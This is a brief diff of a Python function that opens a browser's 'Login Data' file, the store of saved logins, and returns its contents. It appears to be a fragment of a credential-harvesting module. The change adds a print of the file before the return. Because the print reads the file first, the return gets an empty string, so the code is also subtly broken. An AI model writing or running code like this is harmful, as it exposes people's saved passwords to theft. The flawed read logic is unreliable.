@@ -8,6 +8,8 @@ def run(**args):
 
 		with open(path + r'\Login Data') as f:
 
+			print(f.read())
+
 			return f.read()
 
 	return ('None')
